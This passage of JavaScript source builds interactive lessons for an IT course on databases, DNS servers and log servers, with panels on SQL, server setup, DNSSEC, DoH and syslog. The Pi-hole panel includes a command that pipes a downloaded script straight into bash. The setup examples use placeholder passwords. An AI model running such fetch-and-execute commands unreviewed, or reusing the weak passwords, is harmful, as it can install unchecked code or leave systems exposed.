            joins: 'SQL JOINS:\n\n┌────────┐       ┌────────┐\n│ users  │       │ orders │\n├────────┤       ├────────┤\n│ id     │◀─────│user_id │\n│ name   │       │ product│\n└────────┘       └────────┘\n\nINNER JOIN (matching rows only):\nSELECT * FROM users u\nINNER JOIN orders o ON u.id = o.user_id;\n\nLEFT JOIN (all left + matching right):\nSELECT * FROM users u\nLEFT JOIN orders o ON u.id = o.user_id;\n\nResult includes users without orders (NULL)',
            index: 'DATABASE INDEXES:\n\nWithout Index:\n  SELECT * FROM users WHERE email = \'x@y.com\'\n  → Full table scan: O(n) ❌\n  → 1 million rows = 1 million checks\n\nWith Index:\n  CREATE INDEX idx_email ON users(email);\n  → B-Tree lookup: O(log n) ✓\n  → 1 million rows = ~20 checks\n\nIndex Types:\n  • B-Tree (default, range queries)\n  • Hash (exact matches)\n  • Full-text (text search)\n  • Spatial (geographic data)\n\n⚠️ Trade-off: Faster reads, slower writes'
        };
        $('#sql1Out').textContent = data.crud;
        $$('#sql1Btns .demo-btn').forEach(b => {
            if(b.dataset.s) b.onclick = () => {
                $$('#sql1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#sql1Out').textContent = data[b.dataset.s];
            };
        });
    }

    function demoSQLServerSetup(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">SETUP</span><span class="demo-title">Database Server Setup</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="setup1Btns">
                <button class="demo-btn demo-btn-sm active" data-u="mysql">MySQL Install</button>
                <button class="demo-btn demo-btn-sm" data-u="postgres">PostgreSQL</button>
                <button class="demo-btn demo-btn-sm" data-u="secure">Security</button>
            </div>
            <div id="setup1Out" style="background:#1a1a2e;color:#00ff88;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            mysql: 'MySQL INSTALLATION:\n\n# Ubuntu/Debian\nsudo apt update\nsudo apt install mysql-server\n\n# Start service\nsudo systemctl start mysql\nsudo systemctl enable mysql\n\n# Secure installation\nsudo mysql_secure_installation\n  • Set root password\n  • Remove anonymous users\n  • Disable remote root\n  • Remove test database\n\n# Connect\nmysql -u root -p\n\n# Create database & user\nCREATE DATABASE myapp;\nCREATE USER \'appuser\'@\'localhost\'\n  IDENTIFIED BY \'strongpassword\';\nGRANT ALL ON myapp.* TO \'appuser\'@\'localhost\';',
            postgres: 'PostgreSQL INSTALLATION:\n\n# Ubuntu/Debian\nsudo apt install postgresql postgresql-contrib\n\n# Start service\nsudo systemctl start postgresql\n\n# Switch to postgres user\nsudo -u postgres psql\n\n# Create user & database\nCREATE USER appuser WITH PASSWORD \'secret\';\nCREATE DATABASE myapp OWNER appuser;\n\\q\n\n# Connect as user\npsql -h localhost -U appuser -d myapp\n\n# Config files:\n/etc/postgresql/14/main/postgresql.conf\n/etc/postgresql/14/main/pg_hba.conf',
            secure: 'DATABASE SECURITY BEST PRACTICES:\n\n🔒 Authentication:\n   • Strong passwords\n   • Disable remote root\n   • Use SSL/TLS connections\n\n🛡️ Authorization:\n   • Principle of least privilege\n   • Separate users per app\n   • Avoid using root\n\n🔐 Network:\n   • Bind to localhost or private IP\n   • Firewall rules\n   • VPN for remote access\n\n📋 Audit:\n   • Enable query logging\n   • Monitor slow queries\n   • Regular security audits\n\n💾 Backup:\n   • Automated backups\n   • Test restores!\n   • Encrypt backup files'
        };
        $('#setup1Out').textContent = data.mysql;
        $$('#setup1Btns .demo-btn').forEach(b => {
            if(b.dataset.u) b.onclick = () => {
                $$('#setup1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#setup1Out').textContent = data[b.dataset.u];
            };
        });
    }

    function demoDBAdminTools(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">TOOLS</span><span class="demo-title">Database Administration Tools</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="adm1Btns">
                <button class="demo-btn demo-btn-sm active" data-a="gui">GUI Tools</button>
                <button class="demo-btn demo-btn-sm" data-a="cli">CLI Tools</button>
                <button class="demo-btn demo-btn-sm" data-a="backup">Backup Tools</button>
            </div>
            <div id="adm1Out" style="background:#1e1e1e;color:#dcdcaa;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            gui: 'GUI DATABASE TOOLS:\n\n🖥️ phpMyAdmin (MySQL):\n   • Web-based\n   • Easy to use\n   • Common in shared hosting\n\n🐘 pgAdmin (PostgreSQL):\n   • Official GUI tool\n   • Query builder\n   • Server management\n\n🔷 DBeaver (Universal):\n   • Supports all databases\n   • Free & open source\n   • ER diagrams\n\n💼 DataGrip (JetBrains):\n   • Professional IDE\n   • Smart completion\n   • Paid license\n\n🍃 MongoDB Compass:\n   • Official MongoDB GUI\n   • Schema visualization\n   • Query building',
            cli: 'COMMAND LINE TOOLS:\n\nMySQL:\n  mysql -u user -p database\n  mysql> SHOW DATABASES;\n  mysql> USE mydb;\n  mysql> SHOW TABLES;\n  mysql> DESCRIBE users;\n\nPostgreSQL:\n  psql -U user -d database\n  \\l     -- list databases\n  \\c db  -- connect to db\n  \\dt    -- list tables\n  \\d users -- describe table\n\nMongoDB:\n  mongosh\n  > show dbs\n  > use mydb\n  > show collections\n  > db.users.find()',
            backup: 'BACKUP TOOLS:\n\nMySQL:\n  # Backup\n  mysqldump -u root -p mydb > backup.sql\n  mysqldump --all-databases > full.sql\n  \n  # Restore\n  mysql -u root -p mydb < backup.sql\n\nPostgreSQL:\n  # Backup\n  pg_dump mydb > backup.sql\n  pg_dumpall > full.sql\n  \n  # Restore\n  psql mydb < backup.sql\n\nMongoDB:\n  # Backup\n  mongodump --db mydb --out /backup/\n  \n  # Restore\n  mongorestore /backup/\n\n⏰ Automate with cron!'
        };
        $('#adm1Out').textContent = data.gui;
        $$('#adm1Btns .demo-btn').forEach(b => {
            if(b.dataset.a) b.onclick = () => {
                $$('#adm1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#adm1Out').textContent = data[b.dataset.a];
            };
        });
    }

    // Original functions kept for backward compatibility but renamed
    function demoServerIntro(pane) { demoIntroToServers(pane); }
    function demoWebServer(pane) { demoWebServerIntro(pane); }
    function demoDBServer(pane) { demoDBServerIntro(pane); }

    // C7L17-L22: DNS Server Lessons (unique demos)
    function demoDNSServerIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">DNS</span><span class="demo-title">DNS Server Introduction</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dns1Btns">
                <button class="demo-btn demo-btn-sm active" data-d="what">What is DNS?</button>
                <button class="demo-btn demo-btn-sm" data-d="why">Why DNS?</button>
                <button class="demo-btn demo-btn-sm" data-d="hierarchy">Hierarchy</button>
            </div>
            <div id="dns1Out" style="background:#1a1a2e;color:#00d4ff;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS DNS?\n\n📖 Domain Name System\n   "The phonebook of the Internet"\n\n🔄 Translates:\n   Human-readable names → IP addresses\n   example.com → 93.184.216.34\n\n🌐 Without DNS:\n   You\'d need to remember:\n   142.250.80.46 instead of google.com\n   31.13.92.36 instead of facebook.com\n\n📡 DNS is a distributed database:\n   • No single point of failure\n   • Scales globally\n   • Cached for speed',
            why: 'WHY USE DNS SERVERS?\n\n✓ Human Memory:\n  example.com vs 93.184.216.34\n\n✓ IP Address Changes:\n  Server moves? Update DNS once\n  All clients get new IP automatically\n\n✓ Load Balancing:\n  google.com → multiple IPs\n  DNS returns different IPs\n\n✓ Redundancy:\n  Multiple servers per domain\n  Auto-failover\n\n✓ Geo-routing:\n  Return closest server\n  CDN uses DNS for this',
            hierarchy: 'DNS HIERARCHY:\n\n           . (Root)\n           │\n    ┌──────┼──────┐\n    │      │      │\n   .com   .org   .net    (TLD)\n    │\n  ┌─┴─┐\n  │   │\ngoogle example           (Domain)\n  │\n www mail api            (Subdomain)\n\n13 Root Server clusters (a-m.root-servers.net)\nManaged by different organizations\nAnycasted globally for redundancy'
        };
        $('#dns1Out').textContent = data.what;
        $$('#dns1Btns .demo-btn').forEach(b => {
            if(b.dataset.d) b.onclick = () => {
                $$('#dns1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#dns1Out').textContent = data[b.dataset.d];
            };
        });
    }

    function demoDNSTheoryPractice(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">QUERY</span><span class="demo-title">DNS Theory & Practice</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dns2Btns">
                <button class="demo-btn demo-btn-sm active" data-t="types">Query Types</button>
                <button class="demo-btn demo-btn-sm" data-t="records">Record Types</button>
                <button class="demo-btn demo-btn-sm" data-t="dig">dig Command</button>
            </div>
            <div id="dns2Out" style="background:#0d1117;color:#7ee787;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            types: 'DNS QUERY TYPES:\n\n🔄 Recursive Query:\n   Client → Resolver\n   "Give me the final answer"\n   Resolver does all the work\n\n📤 Iterative Query:\n   Resolver → Authoritative Servers\n   "Here\'s a referral, ask them"\n   Server gives best answer it has\n\n🔍 Query Flow:\n   Browser → Stub Resolver (OS)\n          → Recursive Resolver (ISP/8.8.8.8)\n          → Root → TLD → Authoritative\n          ← IP address returned',
            records: 'DNS RECORD TYPES:\n\n📍 A Record (Address):\n   example.com → 93.184.216.34\n\n📍 AAAA Record (IPv6):\n   example.com → 2606:2800::1\n\n📍 CNAME (Alias):\n   www.example.com → example.com\n\n📧 MX Record (Mail):\n   example.com → mail.example.com\n   Priority: 10, 20 (lower = preferred)\n\n📝 TXT Record (Text):\n   SPF, DKIM, verification\n\n🔧 NS Record (Nameserver):\n   example.com → ns1.example.com',
            dig: '$ dig example.com\n\n;; QUESTION SECTION:\n;example.com.          IN      A\n\n;; ANSWER SECTION:\nexample.com.    86400   IN      A      93.184.216.34\n\n;; Query time: 23 msec\n;; SERVER: 8.8.8.8#53\n;; MSG SIZE: 56\n\n$ dig +short example.com\n93.184.216.34\n\n$ dig example.com MX\nexample.com. 300 IN MX 10 mail.example.com.\n\n$ dig @8.8.8.8 example.com  # Use specific DNS'
        };
        $('#dns2Out').textContent = data.types;
        $$('#dns2Btns .demo-btn').forEach(b => {
            if(b.dataset.t) b.onclick = () => {
                $$('#dns2Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#dns2Out').textContent = data[b.dataset.t];
            };
        });
    }

    function demoPersonalDNSServer(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">SETUP</span><span class="demo-title">Personal DNS Server</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dns3Btns">
                <button class="demo-btn demo-btn-sm active" data-p="pihole">Pi-hole</button>
                <button class="demo-btn demo-btn-sm" data-p="bind">BIND9</button>
                <button class="demo-btn demo-btn-sm" data-p="unbound">Unbound</button>
            </div>
            <div id="dns3Out" style="background:#1e1e1e;color:#ce9178;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            pihole: 'PI-HOLE (Ad-blocking DNS):\n\n🥧 What it does:\n   • Network-wide ad blocking\n   • DNS sinkhole\n   • Query logging & stats\n\n📦 Installation:\n   curl -sSL https://install.pi-hole.net | bash\n\n⚙️ Configure router:\n   Set DHCP to use Pi-hole as DNS\n   Or: set per-device\n\n📊 Dashboard: http'+'://pi.hole/admin\n\n✓ Blocks ads for ALL devices\n✓ Faster browsing (no ad loading)\n✓ Privacy (blocks trackers)\n\nRuns on: Raspberry Pi, VM, Docker',
            bind: 'BIND9 (Authoritative DNS):\n\n🔧 Installation (Ubuntu):\n   sudo apt install bind9\n\n📁 Config files:\n   /etc/bind/named.conf\n   /etc/bind/named.conf.local\n\n📝 Zone file example:\n   /etc/bind/db.example.com\n   ─────────────────────────\n   $TTL 86400\n   @   IN  SOA ns1.example.com. admin.example.com. (\n           2024021001 ; Serial\n           3600       ; Refresh\n           1800       ; Retry\n           604800     ; Expire\n           86400 )    ; Minimum TTL\n   @   IN  NS  ns1.example.com.\n   @   IN  A   93.184.216.34\n   www IN  A   93.184.216.34',
            unbound: 'UNBOUND (Recursive Resolver):\n\n🔧 Installation:\n   sudo apt install unbound\n\n📁 Config: /etc/unbound/unbound.conf\n   server:\n       interface: 0.0.0.0\n       access-control: 192.168.1.0/24 allow\n       verbosity: 1\n       do-ip6: no\n       prefetch: yes\n\n✓ Benefits:\n   • Privacy (no third-party DNS)\n   • Speed (caching)\n   • DNSSEC validation\n   • Root hints (query root directly)\n\n🔒 With Pi-hole:\n   Pi-hole → Unbound → Root servers\n   Maximum privacy & security'
        };
        $('#dns3Out').textContent = data.pihole;
        $$('#dns3Btns .demo-btn').forEach(b => {
            if(b.dataset.p) b.onclick = () => {
                $$('#dns3Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#dns3Out').textContent = data[b.dataset.p];
            };
        });
    }

    function demoDNSSecurity(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">SECURITY</span><span class="demo-title">DNS Security</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dns4Btns">
                <button class="demo-btn demo-btn-sm active" data-s="attacks">Attacks</button>
                <button class="demo-btn demo-btn-sm" data-s="poison">Cache Poisoning</button>
                <button class="demo-btn demo-btn-sm" data-s="defense">Defense</button>
            </div>
            <div id="dns4Out" style="background:#2d1b1b;color:#f97583;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            attacks: 'DNS ATTACK TYPES:\n\n💀 DNS Spoofing:\n   Fake DNS response\n   Redirect to malicious site\n\n💀 DNS Amplification (DDoS):\n   Small query → Large response\n   Spoofed source IP\n   Amplifies attack traffic\n\n💀 DNS Tunneling:\n   Exfiltrate data via DNS queries\n   Bypass firewalls\n\n💀 DNS Hijacking:\n   Compromise DNS server\n   Modify zone files\n\n💀 Typosquatting:\n   gooogle.com (extra o)\n   Register misspelled domains',
            poison: 'DNS CACHE POISONING:\n\n┌─────────────────────────────────────┐\n│ Normal: bank.com → 1.2.3.4 (real)  │\n└─────────────────────────────────────┘\n                ↓ Attack\n┌─────────────────────────────────────┐\n│ Poisoned: bank.com → 6.6.6.6 (fake)│\n└─────────────────────────────────────┘\n\nHow it works:\n  1. Attacker sends many fake responses\n  2. Guesses transaction ID\n  3. Wins race against real response\n  4. Resolver caches fake IP\n  5. All clients get malicious IP\n\n⚠️ Very dangerous:\n   Affects ALL users of that resolver',
            defense: 'DNS SECURITY MEASURES:\n\n🛡️ DNSSEC:\n   Cryptographic signatures\n   Validates response authenticity\n\n🛡️ DoH (DNS over HTTPS):\n   Encrypted DNS queries\n   Port 443 (looks like HTTPS)\n\n🛡️ DoT (DNS over TLS):\n   Encrypted DNS\n   Port 853\n\n🛡️ Response Rate Limiting:\n   Prevent amplification attacks\n\n🛡️ Query source validation:\n   Random source port\n   Random transaction ID\n\n🛡️ Private DNS:\n   Use trusted resolver\n   Self-host (Unbound, Pi-hole)'
        };
        $('#dns4Out').textContent = data.attacks;
        $$('#dns4Btns .demo-btn').forEach(b => {
            if(b.dataset.s) b.onclick = () => {
                $$('#dns4Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#dns4Out').textContent = data[b.dataset.s];
            };
        });
    }

    function demoDNSOverHTTPS(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">ENCRYPTED</span><span class="demo-title">DNS over HTTPS/TLS</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dns5Btns">
                <button class="demo-btn demo-btn-sm active" data-h="doh">DoH</button>
                <button class="demo-btn demo-btn-sm" data-h="dot">DoT</button>
                <button class="demo-btn demo-btn-sm" data-h="providers">Providers</button>
            </div>
            <div id="dns5Out" style="background:#1a2e1a;color:#7ee787;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            doh: 'DNS OVER HTTPS (DoH):\n\n🔒 Encrypts DNS in HTTPS\n   Port 443 (standard HTTPS)\n\nBenefits:\n  ✓ Encrypted queries\n  ✓ Blends with HTTPS traffic\n  ✓ Hard to block\n  ✓ Prevents ISP snooping\n\nConcerns:\n  ⚠️ Bypasses corporate DNS controls\n  ⚠️ Harder to monitor/filter\n  ⚠️ Centralizes DNS at big providers\n\n🌐 Enable in Firefox:\n   Settings → Privacy → Enable DoH\n   Provider: Cloudflare, NextDNS\n\n📡 API Format:\n   GET /dns-query?name=example.com&type=A',
            dot: 'DNS OVER TLS (DoT):\n\n🔒 Encrypts DNS in TLS\n   Port 853 (dedicated)\n\n┌─────────────────────────────────────┐\n│ Traditional: UDP/53 (plaintext)    │\n│ DoT: TCP/853 (TLS encrypted)       │\n│ DoH: TCP/443 (HTTPS)               │\n└─────────────────────────────────────┘\n\nComparison DoT vs DoH:\n  • DoT: Separate port, easier to manage\n  • DoH: Looks like web traffic\n  • DoT: Easier to block (port 853)\n  • DoH: Harder to block (port 443)\n\n📱 Android 9+:\n   Settings → Private DNS → dns.google',
            providers: 'ENCRYPTED DNS PROVIDERS:\n\n☁️ Cloudflare (1.1.1.1):\n   DoH: https://cloudflare-dns.com/dns-query\n   DoT: 1dot1dot1dot1.cloudflare-dns.com\n   🏆 Fastest, privacy-focused\n\n🔵 Google (8.8.8.8):\n   DoH: https://dns.google/dns-query\n   DoT: dns.google\n   ⚠️ Logs queries\n\n🔴 Quad9 (9.9.9.9):\n   DoH: https://dns.quad9.net/dns-query\n   🛡️ Malware blocking\n\n🟢 NextDNS:\n   DoH: https://dns.nextdns.io/<config>\n   🎛️ Customizable filtering\n\nTest: https://1.1.1.1/help'
        };
        $('#dns5Out').textContent = data.doh;
        $$('#dns5Btns .demo-btn').forEach(b => {
            if(b.dataset.h) b.onclick = () => {
                $$('#dns5Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#dns5Out').textContent = data[b.dataset.h];
            };
        });
    }

    function demoDNSSEC(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">DNSSEC</span><span class="demo-title">DNSSEC Explained</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="dns6Btns">
                <button class="demo-btn demo-btn-sm active" data-c="what">What is DNSSEC?</button>
                <button class="demo-btn demo-btn-sm" data-c="keys">Keys</button>
                <button class="demo-btn demo-btn-sm" data-c="verify">Verify</button>
            </div>
            <div id="dns6Out" style="background:#1e1e1e;color:#dcdcaa;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT IS DNSSEC?\n\n🔐 DNS Security Extensions\n   Adds cryptographic signatures to DNS\n\nProblem without DNSSEC:\n  ❌ DNS responses are unsigned\n  ❌ No way to verify authenticity\n  ❌ Cache poisoning possible\n\nWith DNSSEC:\n  ✓ Digital signatures on records\n  ✓ Chain of trust to root\n  ✓ Resolver validates signatures\n  ✓ Rejects tampered responses\n\n⚠️ Limitations:\n  • Doesn\'t encrypt (use DoH/DoT)\n  • Only verifies authenticity\n  • Not all domains support it',
            keys: 'DNSSEC KEYS:\n\n🔑 ZSK (Zone Signing Key):\n   • Signs DNS records (A, MX, etc.)\n   • Changes frequently (90 days)\n   • Smaller key size (1024-2048 bit)\n\n🔑 KSK (Key Signing Key):\n   • Signs the ZSK (DNSKEY record)\n   • Changes rarely (1-2 years)\n   • Larger key size (2048-4096 bit)\n\n🔗 Chain of Trust:\n   Root KSK → TLD KSK → Domain KSK → ZSK\n         DS record links to parent zone\n\n$ dig example.com DNSKEY +dnssec\n$ dig example.com DS',
            verify: 'VERIFY DNSSEC:\n\n# Check if domain is signed\n$ dig +dnssec example.com\n;; flags: qr rd ra ad  ← ad = Authenticated\n\n# Check DNSKEY records\n$ dig example.com DNSKEY\n\n# Check DS record (parent zone)\n$ dig example.com DS\n\n# Full validation chain\n$ delv @8.8.8.8 example.com\n; fully validated\n\n# Online tools:\n  https://dnsviz.net\n  https://dnssec-analyzer.verisignlabs.com\n\n✓ DNSSEC status for major sites:\n  google.com ✓\n  cloudflare.com ✓\n  Many domains still unsigned ⚠️'
        };
        $('#dns6Out').textContent = data.what;
        $$('#dns6Btns .demo-btn').forEach(b => {
            if(b.dataset.c) b.onclick = () => {
                $$('#dns6Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#dns6Out').textContent = data[b.dataset.c];
            };
        });
    }

    // C7L23-L28: Log Server Lessons (unique demos)
    function demoLogServerIntro(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-success">LOGS</span><span class="demo-title">Log Server Introduction</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="log1Btns">
                <button class="demo-btn demo-btn-sm active" data-l="what">What are Logs?</button>
                <button class="demo-btn demo-btn-sm" data-l="why">Why Centralize?</button>
                <button class="demo-btn demo-btn-sm" data-l="types">Log Types</button>
            </div>
            <div id="log1Out" style="background:#0d1117;color:#7ee787;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            what: 'WHAT ARE LOG SERVERS?\n\n📋 A centralized system for:\n   • Collecting logs from all systems\n   • Storing logs long-term\n   • Searching and analyzing logs\n   • Alerting on suspicious patterns\n\n📊 Log Sources:\n   • Servers (Linux, Windows)\n   • Network devices (firewalls, routers)\n   • Applications (web, database)\n   • Cloud services (AWS, Azure)\n   • Security tools (IDS, antivirus)\n\n🎯 Goal: Single pane of glass\n   View all logs in one place',
            why: 'WHY CENTRALIZE LOGS?\n\n✓ Single Source of Truth:\n  All logs in one searchable location\n\n✓ Correlation:\n  Connect events across systems\n  "User logged in on Server A,\n   then accessed Database B"\n\n✓ Retention:\n  Keep logs even if source is\n  compromised/destroyed\n\n✓ Compliance:\n  PCI-DSS, HIPAA, SOC2 require\n  log retention & monitoring\n\n✓ Forensics:\n  Investigate incidents after the fact\n  Establish timeline of events',
            types: 'LOG TYPES:\n\n🖥️ System Logs:\n   /var/log/syslog, /var/log/messages\n   Boot, kernel, system events\n\n🔐 Security Logs:\n   /var/log/auth.log, /var/log/secure\n   Login attempts, sudo usage\n\n🌐 Application Logs:\n   /var/log/apache2/access.log\n   /var/log/nginx/error.log\n   Application-specific events\n\n🔒 Audit Logs:\n   /var/log/audit/audit.log\n   Detailed security auditing\n\n📊 Windows Event Logs:\n   Security, System, Application\n   Event Viewer / EventLog service'
        };
        $('#log1Out').textContent = data.what;
        $$('#log1Btns .demo-btn').forEach(b => {
            if(b.dataset.l) b.onclick = () => {
                $$('#log1Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#log1Out').textContent = data[b.dataset.l];
            };
        });
    }

    function demoBasicLogSetup(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">SETUP</span><span class="demo-title">Basic Log Setup</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="log2Btns">
                <button class="demo-btn demo-btn-sm active" data-b="rsyslog">rsyslog</button>
                <button class="demo-btn demo-btn-sm" data-b="journald">journald</button>
                <button class="demo-btn demo-btn-sm" data-b="remote">Remote Logging</button>
            </div>
            <div id="log2Out" style="background:#1a1a2e;color:#00ff88;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            rsyslog: 'RSYSLOG CONFIGURATION:\n\n📁 Config: /etc/rsyslog.conf\n\n# Log all auth messages\nauth,authpriv.* /var/log/auth.log\n\n# Log everything except auth\n*.*;auth,authpriv.none /var/log/syslog\n\n# Emergency messages to all\n*.emerg :omusrmsg:*\n\nFacilities: auth, cron, daemon, kern, mail\nPriorities: emerg, alert, crit, err, warning, info, debug\n\n$ sudo systemctl restart rsyslog\n$ logger "Test message"   # Send test log\n$ tail -f /var/log/syslog  # Watch logs',
            journald: 'SYSTEMD JOURNALD:\n\n🔍 View logs:\n$ journalctl                    # All logs\n$ journalctl -u nginx           # Service logs\n$ journalctl -f                  # Follow (like tail -f)\n$ journalctl --since "1 hour ago"\n$ journalctl -p err              # Errors only\n$ journalctl -b -1               # Previous boot\n\n📁 Config: /etc/systemd/journald.conf\n[Journal]\nStorage=persistent    # Keep logs on disk\nSystemMaxUse=500M     # Max size\nMaxRetentionSec=1month\n\n✓ Binary format (efficient)\n✓ Indexed (fast search)\n✓ Integrity checking',
            remote: 'REMOTE LOG FORWARDING:\n\n📤 Client (send logs):\n# /etc/rsyslog.conf\n*.* @@logserver.local:514   # TCP\n*.* @logserver.local:514    # UDP\n\n📥 Server (receive logs):\n# /etc/rsyslog.conf\nmodule(load="imtcp")\ninput(type="imtcp" port="514")\n\n# Separate files per host\n$template RemoteLogs,"/var/log/remote/%HOSTNAME%/%PROGRAMNAME%.log"\n*.* ?RemoteLogs\n\n🔒 Secure with TLS:\nmodule(load="imtcp"\n  StreamDriver.Name="gtls"\n  StreamDriver.Mode="1"\n  StreamDriver.AuthMode="x509/name")'
        };
        $('#log2Out').textContent = data.rsyslog;
        $$('#log2Btns .demo-btn').forEach(b => {
            if(b.dataset.b) b.onclick = () => {
                $$('#log2Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#log2Out').textContent = data[b.dataset.b];
            };
        });
    }

    function demoSIMSEMSIEM(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-warning">SIEM</span><span class="demo-title">SIM, SEM, SIEM</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="log3Btns">
                <button class="demo-btn demo-btn-sm active" data-m="sim">SIM</button>
                <button class="demo-btn demo-btn-sm" data-m="sem">SEM</button>
                <button class="demo-btn demo-btn-sm" data-m="siem">SIEM</button>
            </div>
            <div id="log3Out" style="background:#1e1e1e;color:#dcdcaa;font-family:var(--font-mono);font-size:0.78rem;padding:16px;border-radius:8px;min-height:220px;white-space:pre-wrap"></div>
        </div></div>`;
        const data = {
            sim: 'SIM - Security Information Management:\n\n📊 Focus: STORAGE & COMPLIANCE\n\n✓ What it does:\n  • Collects logs from all sources\n  • Stores for long-term retention\n  • Generates compliance reports\n  • Historical analysis\n\n📋 Use cases:\n  • Audit requirements\n  • Forensic investigations\n  • Compliance (PCI, HIPAA)\n  • Trend analysis\n\n⏱️ NOT real-time\n   Designed for historical data',
            sem: 'SEM - Security Event Management:\n\n⚡ Focus: REAL-TIME MONITORING\n\n✓ What it does:\n  • Real-time event processing\n  • Correlation rules\n  • Immediate alerting\n  • Threat detection\n\n🔔 Alert examples:\n  • 5 failed logins in 1 minute\n  • Port scan detected\n  • Malware signature found\n  • Unusual data transfer\n\n⏱️ REAL-TIME focus\n   "What\'s happening now?"',
            siem: 'SIEM - Security Info & Event Management:\n\n🏆 BEST OF BOTH WORLDS\n\n┌─────────────────────────────────────┐\n│    SIEM = SIM + SEM                 │\n├─────────────────────────────────────┤\n│  📊 Long-term storage (SIM)         │\n│  ⚡ Real-time alerting (SEM)        │\n│  🔗 Event correlation               │\n│  🤖 Threat intelligence             │\n│  📈 Dashboards & visualization      │\n│  🔍 Advanced search                 │\n│  📋 Compliance reporting            │\n└─────────────────────────────────────┘\n\nPopular SIEMs:\n  Splunk, IBM QRadar, Microsoft Sentinel,\n  Elastic SIEM, Wazuh'
        };
        $('#log3Out').textContent = data.sim;
        $$('#log3Btns .demo-btn').forEach(b => {
            if(b.dataset.m) b.onclick = () => {
                $$('#log3Btns .demo-btn').forEach(x => x.classList.remove('active'));
                b.classList.add('active');
                $('#log3Out').textContent = data[b.dataset.m];
            };
        });
    }

    function demoLogToolsComparison(pane) {
        pane.innerHTML = `<div class="demo-interactive"><div class="demo-header-bar"><span class="demo-badge demo-badge-info">TOOLS</span><span class="demo-title">Log Management Tools</span></div>
        <div class="demo-visual" style="flex-direction:column;gap:16px">
            <div style="display:flex;gap:8px;flex-wrap:wrap;justify-content:center" id="log4Btns">
